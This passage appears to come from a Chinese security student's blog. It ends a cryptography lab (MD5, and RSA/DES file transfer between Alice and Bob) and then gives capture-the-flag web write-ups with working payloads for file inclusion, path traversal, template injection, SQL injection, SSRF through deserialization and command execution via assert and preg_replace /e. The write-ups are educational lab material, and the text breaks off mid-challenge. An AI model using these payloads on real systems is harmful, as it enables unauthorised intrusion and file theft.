* 4 + 2])), 15)) B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*4+3)*7)%16]), Ti[j + i * 4 + 3])), 21)) # 第五步 将计算出的A,B,C,D与初始的相加，并赋值 A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD) # 输出得到的密文 ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D) cipher = ciphertext ciphertext = str(hex(int(ciphertext, 2))[2:]) # 将二进制数转换为十六进制数 ciphertext = &#x27;0&#x27;*(32-len(ciphertext))+ciphertext # 为了避免第一个数字为零时无法显示出来 print(&quot;hash值(小写):&quot;,ciphertext) print(&quot;hash值(大写):&quot;,ciphertext.upper()) 六、综合实验6.1 实验内容现在，Alice想通过公共信道给Bob传输一份秘密文件（文件非常大）。又知道，很多人和机构想得到这份文件。需要设计一个通信模型，来保证文件的机密性和完整性。 现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。 6.2 分析实验需求现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。 根据分析，所得结果如下: 传输的是秘密文件，所以可能存在人冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。 在确认彼此身份后需要将文件通过公共信道传输，但是可能存在攻击人劫持，所以需要对文件内容加密，而文件内容很大，考虑到加密速度问题，所以采用对称加密算法。 采用对称加密算法需要密钥，而这里使用随机生成的密钥。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以解决传输此次加密使用的密钥，提高安全性和效率。 Bob收到密文和加密后的密钥，使用自己的私钥解密出对称加密算法使用的密钥，然后使用密钥解密密文后向Alice发送确认消息，确保bob收到消息。 确认消息也要使用到第一步使用的签名算法。 6.3 程序流程图 6.4 完整代码Alice # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : Alice.py from RSA import * from DES import * from MD5 import * from file_decode import * import socket n_bob = 81836285346168841919828227774710209132464519960137459236348092425786962849543 n = 44531776921047477359676235110843825307036514195195627878765712056028758572817 d = 34159352569920789505556306994405309761109146525598570740717995833480670158209 e = 65537 name = &quot;This is alice.&quot; client = socket.socket() client.connect((&#x27;127.0.0.1&#x27;,8888)) # 本机地址和端口 data = client.recv(1024) print(str(data, &quot;utf-8&quot;),end=&quot;&quot;) client.send(b&#x27;1&#x27;) print(&quot;等待bob验证自身身份...&quot;) # alice送出自己的身份信息和签名值 client.send(bytes(name,&#x27;utf-8&#x27;)) # alice发送身份明文信息 client.recv(1024).decode() hash_name = md5(name) crpto_name = str(RSAEncode(hash_name, d, n)) # 发送对hash值加密后的值 crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) client.send(crpto_name) print(client.recv(1024).decode()) # 接收身份认证的结果 #接收bob身份hash并验证 print(&quot;验证bob身份...&quot;,end=&quot;&quot;) a=input() bob_name = client.recv(512).decode() # bob发送过来的身份明文信息 client.send(b&#x27;1&#x27;) hash_name = client.recv(512).decode() # bob使用自己的私钥加密身份明文信息hash值后的值 plain_text = RSADecode(int(hash_name),e,n_bob) # 使用bob的公钥解密上一步的值 client.send(b&#x27;1&#x27;) if plain_text == md5(bob_name): # 验证是不是bob print(bob_name) print(&quot;验证通过!&quot;) else: exit(&quot;验证错误!&quot;) while 1: a = input() bin_key = gen_key() # 随机生成64位的 DES加密明文使用的密钥 int_key = int(bin_key,2) # 将其转换为十进制数，便于后面使用RSA算法加密 print(&quot;随机产生对称密钥:&quot;,int_key) # 每次传输随机产生一个密钥更加安全 plain = read_file() # 读取文件内容 bin_cipher = DES_encode(plain, bin_key) # 使用DES算法加密内容 a = input() int_key = fast_mod(int_key,e,n_bob) # 加密DES的密钥 e是bob的公钥 print(&quot;加密对称密钥&quot;) print(&quot;传输密钥...&quot;) # 传输加密后DES密钥 client.sendall(bytes(str(int_key),&quot;utf-8&quot;)) client.recv(512) length = str(len(bin_cipher)) # 传输发送内容的长度 length = bytes(length,&quot;utf-8&quot;) # 方便其接收 client.send(length) print(&quot;传输密文...&quot;) client.sendall(bytes(str(bin_cipher),&quot;utf-8&quot;)) #发送密文 message = client.recv(512).decode() client.send(b&#x27;1&#x27;) crypt_message = client.recv(512).decode() hash_message = RSADecode(int(crypt_message),e,n_bob) if hash_message == md5(message): print(message) print(&quot;文件传输结束！&quot;) break client.close() Bob # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : bob.py import socket import libnum from RSA import * from DES import * from MD5 import * name = &quot;This is bob.&quot; n = 81836285346168841919828227774710209132464519960137459236348092425786962849543 n_alice = 44531776921047477359676235110843825307036514195195627878765712056028758572817 d = 39540198292360595989919600111176873707392294831248672388670326288876701993673 e = 65537 # e_alice = 2081 server = socket.socket() #创建对象 server.bind((&quot;localhost&quot;,8888))#绑定 ip和端口 server.listen() #监听 #等待连接 print(&#x27;Waiting connection...&#x27;) #接受请求，返回套接字对象和IP+端口号 con,addr = server.accept() con.send(bytes(&quot;Welcome connect!\\n开始加密传输:\\n&quot;,&quot;utf-8&quot;)) con.recv(1024) # 验证alice身份 print(&quot;验证alice身份...&quot;) a = input() alice_name = con.recv(512).decode() # alice 的明文信息 con.send(b&#x27;1&#x27;) hash_name = con.recv(512).decode() # alice 用私钥加密明文的hash值 plain_text = RSADecode(int(hash_name),e,n_alice) # 用alice 的公钥解密出hash值 if plain_text == md5(alice_name): # 判断上一步的值与md5函数加密是否相同 print(alice_name) # 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证 print(&quot;验证通过！&quot;) # 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击 con.send(bytes(&quot;您通过了验证!&quot;,&quot;utf-8&quot;)) else: exit(&quot;这不是alice,验证错误！&quot;) #送出自己的身份信息和签名值 print(&quot;等待alice验证自身身份...&quot;) con.send(bytes(name,&#x27;utf-8&#x27;)) # 向alice发送身份信息的明文 con.recv(1024).decode() hash_name = md5(name) # 明文信息的hash值 crpto_name = str(RSAEncode(hash_name, d, n)) # 使用自己的私钥加密上一步的hash值 crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) # 发送给alice con.send(crpto_name) con.recv(1024) while 1: data = con.recv(1024) # 接收alice发送的使用公钥算法加密后的DES的密钥 data = data.decode() int_key = int(data) print(&quot;被加密后的密钥:&quot;,int_key) int_key = fast_mod(int_key, d, n) # 使用私钥d解密出DES密钥 print(&quot;解密后的密钥&quot;, int_key) print(&quot;----&quot;*10) # 接收密文的长度（为了方便存储） con.send(b&#x27;1&#x27;) length = con.recv(1024) length = int(length.decode()) buff = [] size = 0 while size &lt; length: # 开始接受密文 dat = con.recv(1024) size += len(dat.decode()) buff.append(dat) data = b&#x27;&#x27;.join(buff) bin_cipher = data.decode() cipher = bin_to_str(bin_cipher) bin_key = bin(int_key)[2:] # 将密钥转换成二进制数 print(&quot;解密传输内容:&quot;) print(libnum.b2s(DES_decode(cipher, bin_key))) #打印出解密后的明文 message = &quot;Bob received the file successfully!&quot; con.send(bytes(message,&#x27;utf-8&#x27;)) con.recv(1024).decode() hash_message = md5(message) crypt_message = str(RSAEncode(hash_message,d,n)) con.send(bytes(crypt_message,&#x27;utf-8&#x27;)) break server.close() file_decode # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : file_decode.py import random import socket import re from RSA import * from DES import * from MD5 import * def gen_key(): # 生成64位的对称加密的密钥 list = [] for i in range(64): c = random.choice([&#x27;0&#x27;, &#x27;1&#x27;]) list.append(c) res = &quot;&quot;.join(list) return res def read_file(): try: f = open(&#x27;text.txt&#x27;,&#x27;r&#x27;, encoding = &#x27;utf-8&#x27;) text = f.read() f.close() print(&quot;读取成功!&quot;) return text except IOError: print(&quot;读取错误!&quot;) def bin_to_str(bin_str) : # 8位二进制转字符，用于bob收到密后使用 res = &quot;&quot; tmp = re.findall(r&#x27;.&#123;8&#125;&#x27;,bin_str) for i in tmp : res += chr(int(i,2)) return res","tags":[{"name":"古典密码","slug":"古典密码","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"DES","slug":"DES","permalink":"https://sunzhengyu99.github.io/tags/DES/"},{"name":"RSA","slug":"RSA","permalink":"https://sunzhengyu99.github.io/tags/RSA/"},{"name":"MD5","slug":"MD5","permalink":"https://sunzhengyu99.github.io/tags/MD5/"}]},{"title":"adworld","date":"2020-11-30T02:45:48.000Z","path":"2020/11/30/adworld/","text":"为了完成网安作业必须多做点题，顺便写wp Web_php_include利用php伪协议上传一段php代码后执行，列出目录看到flag文件 再利用本地文件包含读取flag http://220.249.52.133:46457/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E warmup查看源码看到source.php，访问看到源码 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 源码中有一个hint.php，查看得到 flag not here, and flag in ffffllllaaaagggg 访问 ffffllllaaaagggg，发现没有这个文件，所以可能是在根目录。 继续看代码有个白名单 source.php,hint.php mb_substr函数会截取?前面的字符返回给page，检测其是否在白名单中 注意这里有一个urldecode()，所以提交前需要进行两次urlencode 解码后重复上面两步 $_page = mb_substr($_page,0,mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)); if (in_array($_page, $whitelist)) &#123; return true; &#125; 之后通过include函数获取flag 所以构造的payload中url解码后?前的内容必须是 source.php或者hint.php payload: GET: ?page=hint.php%253F/../../../../../ffffllllaaaagggg 原理是hint.php?/被当作目录 ../是返回上一级目录，这里多几个../也没事，必须保证返回到根目录，而在根目录向上返回还是根目录。 所以上面的payload可以在根目录读取到flag。 NaNNaNNaNNaN-Batman下载附件打开后显示有乱码，但是可以看到&lt;script&gt;标签，于是改后缀伪html ,在浏览器打开，出现一个输入框。 继续看代码，看到函数的最后有个eval函数，中间的参数为eval(_)，正好与开头定义的名相同&lt;script&gt;_=&#39;function，所以想办法把原函数显示处理 将eval改为alert，保存后在浏览器中打开看到弹框中出现源码。 在线格式化后的结果 function $() &#123; var e = document.getElementById(&quot;c&quot;).value; if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) &#123; var t = [&quot;fl&quot;, &quot;s_a&quot;, &quot;i&quot;, &quot;e&#125;&quot;]; var n = [&quot;a&quot;, &quot;_h0l&quot;, &quot;n&quot;]; var r = [&quot;g&#123;&quot;, &quot;e&quot;, &quot;_0&quot;]; var i = [&quot;it&#x27;&quot;, &quot;_&quot;, &quot;n&quot;]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) &#123; document.write(s[o % 4][0]); s[o % 4].splice(0, 1) &#125; &#125; &#125; document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;); delete _ 再看这段js代码中的if语句 if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) 参数e的长度为16，其中要包含 be0f23开头 233ac e98aa结尾 c7be9 通过if语句后会通过一个算法将flag算出来 ok,那就按if语句的要求写出e be0f233ac7be98aa 还可以直接利用 var t = [&quot;fl&quot;, &quot;s_a&quot;, &quot;i&quot;, &quot;e&#125;&quot;]; var n = [&quot;a&quot;, &quot;_h0l&quot;, &quot;n&quot;]; var r = [&quot;g&#123;&quot;, &quot;e&quot;, &quot;_0&quot;]; var i = [&quot;it&#x27;&quot;, &quot;_&quot;, &quot;n&quot;]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) &#123; document.write(s[o % 4][0]); s[o % 4].splice(0, 1) &#125; 在浏览器的console中运行 web2&lt;?php $miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;; function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_))); &#125; highlight_file(__FILE__); /* 逆向加密算法，解密$miwen就是flag */ ?&gt; 了解几个函数的用法 str_rot13() 函数对字符串执行 ROT13 编码。 ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。 提示：编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。 strrev() 函数反转字符串。 解密脚本 &lt;?php $str = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;; function decode($str)&#123; $s = base64_decode(strrev(str_rot13($str))); //echo($s); for($_0=0;$_0&lt;strlen($s);$_0++)&#123; $_c=substr($s,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; &#125; echo strrev($_); &#125; decode($str); ?&gt; PHP2这题应该给个提示的，访问index.phps获取源码。 phps，用御剑和dirsearch都扫不出来，所以必须知道才可能做出来。 给新生赛出题的想法来源，当时做这题的时候费了好大劲才找到index.phps，所以也让让萌新们体验一下找不到的绝望🤣 &lt;?php if(&quot;admin&quot;===$_GET[id]) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit(); &#125; $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;; &#125; ?&gt; Can you anthenticate to this website? 获取id后urldecode之后再赋值给id，要注意上传的参数浏览器会字段一次urldecode，所以这里的admin需要两次urlencode payload： admin %61%64%6D%69%6E %25%36%31%25%36%34%25%36%44%25%36%39%25%36%45 GET: ?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45 unserialize3很简单的unserialize 利用漏洞，当属性值大于真是属性值的时候会跳过wakeup函数，php版本小于5.6 &lt;?php class xctf&#123; public $flag = &#x27;111&#x27;; // public function __wakeup()&#123; // exit(&#x27;bad requests&#x27;); // &#125; &#125; $c = new xctf(); echo(serialize($c)); ?&gt; O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125; GET: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125; upload1抓包修改MIME为image/jpeg,即可上传成功，之后蚁剑连接拿到flag。 Web_python_template_injection模板注入，和cumtctf华为杯很像，但是没那个难。 首先判断是否存在模板注入，在url后输入 49，显示页面如下，可以确定存在模板注入，因为我们输入的值被其当作变量带入计算。 模板注入原理这篇博客写的很详细：https://xz.aliyun.com/t/3679 几个常用的魔术方法 _class_ 返回类型所属的对象 _mro_ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 _base_ 返回该对象所继承的基类 // base和mro都是用来寻找基类的 _subclasses_ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 _init_ 类的初始化方法 _globals_ 对包含函数全局变量的字典的引 直接开始这题 1.查看所有模块，其中第41个模块file和72个模块，包含文件读取的相关操作，可以利用 &#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125; 2.列出文件目录 &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125; 3.读取flag &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read() easytornado这又是web服务器和web应用框架，会不会和flask框架一样存在模板模板注入 0x1 原理tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过两个大括号进行传递变量和执行简单的表达式。 0x2 解题1.先看看题目给的连接 http://220.249.52.133:43538/file?filename=/welcome.txt&amp;filehash=34b3f8fdcf2ec4394a5b9b20580c0096 提交的参数是文件名和文件的hash值 并且给了三web页面 /flag.txt /welcome.txt /hints.txt flag.txt flag in /fllllllllllllag hints.txt给的提示 /hints.txt md5(cookie_secret+md5(filename)) 这就知道了filehash的来源了 2.读取flag.txt就必须构造payload： //?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/fllllllllllllag)) 但是我们不知道cookie_secret 的值，先提交试试 出现了这个错误页面，并且我们可以控制msg的值，存在模板注入 3.输入msg=&#123;&#123;handler.settings&#125;&#125;,获取当前的环境变量，得到cookie_sercet的值 &lt;?php $filename = md5(&#x27;/fllllllllllllag&#x27;); $s = &#x27;cb82b218-07e3-491d-a302-532dbae27e6a&#x27;; echo md5($s.$filename); ?&gt; 于是构造出payload ?filename=/fllllllllllllag&amp;filehash=0caf8cf587a036fabea3fa65f058c275 拿到flag 参考: https://www.cnblogs.com/cimuhuashuimu/p/11544455.html shrineimport flask import os app = flask.Flask(__name__) app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) @app.route(&#x27;/&#x27;) def index(): return open(__file__).read() @app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;) def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == &#x27;__main__&#x27;: app.run(debug=True) 0x1考察点很明显的flask框架 存在模板注入，但是对()进行了过滤，并将config , self 加入了黑名单，Web_python_template_injection这题的payload就没法用了。 0x2构造payload可以使用内置函数get_flashed_messages()，又因为config在current_app里面，所以我们可以构造payload &#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; mfw看到了git，可能存在git源码泄露 访问http://220.249.52.133:44852/.git/，确定存在源码泄露，使用githack下载源码，目录结构如图，templates下存在flag.php,它就是我们的目标。 代码审计&lt;?php if (isset($_GET[&#x27;page&#x27;])) &#123; $page = $_GET[&#x27;page&#x27;]; &#125; else &#123; $page = &quot;home&quot;; &#125; $file = &quot;templates/&quot; . $page . &quot;.php&quot;; // I heard &#x27;..&#x27; is dangerous! assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); // TODO: Make this look nice assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;); ?&gt; file_exists函数 fil 输入 ?page=flag 页面显示为空，因为file_exists只能判断文件是否存在，无法返回文件内容，这就用利用cat读取内容了。因为没有对page做其他的过滤，我们可以利用assert + system，达到命令注入的目的。 注意：assert函数会将传入的参数当作php代码执行 构造payload，这里就像sql注入的语句，闭合前面的语句并填写自己想要的语句 先测试一下想法对不对 //?page=&#x27;) or phpinfo();# //assert(&quot;file_exists(&#x27;$file&#x27;) or phpinfo();)# ?page=&#x27;)%20or%20phpinfo()%3B%23 显示出了phpinfo(),所以思路是对的 继续构造 //?page=&#x27;) or system(&quot;cat templates/flag.php&quot;); # 最后的payload ?page=&#x27;)%20or%20system(%22cat%20templates%2Fflag.php%22)%3B%23 fakebook0x1 sql注入进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方 http://220.249.52.133:44224/view.php?no=1参数no这里应该是一个数字型的注入点，测试一下。 http://220.249.52.133:44224/view.php?no=1 and 1=1显示是正常的，但是 http://220.249.52.133:44224/view.php?no=1 and 1=2网页报错，确定了就是数字型注入 接下来继续注入的常规操作。 http://220.249.52.133:44224/view.php?no=-2 order by 4#时页面显示正常，并提示了网站的根目录 但是当 order by 5 # 时，网页报错，确定是四列。 爆表名 本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测 试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示 Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 提示存在反序列化，但是不知道怎么用继续爆表。 ?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4# ?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;# //**no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS** 爆出一大堆列名。直接读取data的内容 ?no=-2 union/**/select 1,(select data from users),3,4 # 发现内容是注册时信息保存为序列化内容 O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;sunzy&quot;;s:3:&quot;age&quot;;i:22;s:4:&quot;blog&quot;;s:12:&quot;22.github.io&quot;;&#125; 到这里就不知道怎么办了。。。 做到这里我们大致知道了下面的信息： view.php进行了对某个数据进行反序列化(unserializa)操作，从上面跑出的data分析是对data进行了 反序列化操作,在上一步骤中我们得到了user表有4列分别为no，passwd，data，username，并没有 单独存放blog列，所以blog显示应该是从data列取出再进行反序列化 0x02代码审计扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径 源码 &lt;?php class UserInfo //user信息类 &#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) // 处理url &#123; $ch = curl_init(); //初始化一个curl会话 curl_setopt($ch, CURLOPT_URL, $url); //设置url和相应的参数 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); // 执行这个cURL会话 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); //获取状态码 if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () //这是注册账号时检测blog是否合法 &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125; &#125; 审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。 get($url) get($this-&gt;blog) 这里get中的参数取自blog，所以我们可以利用反序列化构造出一个ssrf，将blog位置修改为我们想要访问的位置，结合上面的提示就构造出下面的payload： ?no=-2%20union/**/select%201,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;sunzy&quot;;s:3:&quot;age&quot;;i:22;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%20# 查看源码，解base64。 思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。 ics-05进入页面只有一个是有用的，进入设备维护中心 先点击云平台设备维护中心，url会发生改变出现page参数，这一看就是典型的读取源码 构造payload: ?page=php://filter/convert.base64-encode/resource=index.php 源码中的php代码 &lt;?php $page = $_GET[page]; if (isset($page)) &#123; if (ctype_alnum($page)) &#123; ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php &#125;else&#123; ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt; &lt;?php if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123; //这里是对几个关键词的过滤，我们读取源码时没有用到这几个关键词所以没有影响 die(); &#125; if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123; die(); &#125; if ($page === &#x27;index.php&#x27;) &#123; die(&#x27;Ok&#x27;); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php &#125;&#125; //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试 if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123; //xxf头 echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern = $_GET[pat]; //get 提交三个参数 $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125; &#125; ?&gt; 前面代码没有突破点，直到看到preg_replace 漏洞 $pattern 存在 /e 模式修正符，允许代码执行 /e 模式修正符，是 *preg_replace() * 导致 $replacement 部分当做php代码来执行。 所以可以构造如下 payload ?pat=/test/e&amp;rep=system(&#x27;ls&#x27;)&amp;sub=test ?pat=/test/e&amp;rep=system(&#x27;ls s3chahahaDir/&#x27;)&amp;sub=test ?pat=/test/e&amp;rep=system(&#x27;ls s3chahahaDir/flag&#x27;)&amp;sub=test ?pat=/test/e&amp;rep=system(&#x27;cat s3chahahaDir/flag/flag.php&#x27;)&amp;sub=test 参考:https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html lottery0x1注册玩一下​ 进入页面发下是一个买彩票的，先注册一个账号，初始有20块钱，要买flag，需要99999999，显然不可能 还有一个买彩票的地方，每次花2块钱两个号码对了奖励五块，这些都不重要。 开始是想着通过脚本多买几次，后来发现不对啊，每次都是买完了之后中将号码才公布出来，脚本就没意义了，所以这个想法断了。 于是去看看了别的 0x2 git源码泄露​ 下载了好几个文件，看看了其中有用的只有api.php，代码太长了，复制了重要的部分 审计代码 //随机生成中将号码 function random_win_nums()&#123; $result = &#x27;&#x27;; for($i=0; $i&lt;7; $i++)&#123; $result .= random_num(); //利用自定义的随机函数生成随机数 &#125; return $result; &#125; //检测是否中奖以及 奖励和扣费规则 function buy($req)&#123; require_registered(); //检测是否注册 require_min_money(2); //是否有2块钱买彩票 $money = $_SESSION[&#x27;money&#x27;]; //用户的钱 $numbers = $req[&#x27;numbers&#x27;]; //用户买的彩票号码 $win_numbers = random_win_nums(); //中奖号码 $same_count = 0; //记录有几位中奖 for($i=0; $i&lt;7; $i++)&#123; // 判断有几位中奖 if($numbers[$i] == $win_numbers[$i])&#123; //重点来了 $same_count++; &#125; &#125; switch ($same_count) &#123; //pass &#125; $money += $prize - 2; $_SESSION[&#x27;money&#x27;] = $money; response([&#x27;status&#x27;=&gt;&#x27;ok&#x27;,&#x27;numbers&#x27;=&gt;$numbers, &#x27;win_numbers&#x27;=&gt;$win_numbers, &#x27;money&#x27;=&gt;$money, &#x27;prize&#x27;=&gt;$prize]); &#125; 上面的代码看着像是没什么问题，但是对==敏感的一眼就会发现这里存在问题 for($i=0; $i&lt;7; $i++)&#123; // 判断有几位中奖 if($numbers[$i] == $win_numbers[$i])&#123; //重点来了 $same_count++; &#125; &#125; 这里判断是否相等居然用 ==，就很离谱，也是突破点，测试效果如下 所以思路就是，抓包修改我们输入的号码都为True，就行了，一次中奖不够就多买几次 注意这里上传数据时使用的是json格式，json数组类型 之后返回浏览器买flag即可 favorite_number&lt;?php //php5.5.9 $stuff = $_POST[&quot;stuff&quot;]; $array = [&#x27;admin&#x27;, &#x27;user&#x27;]; if($stuff === $array &amp;&amp; $stuff[0] != &#x27;admin&#x27;) &#123; $num= $_POST[&quot;num&quot;]; if (preg_match(&quot;/^\\d+$/im&quot;,$num))&#123; if 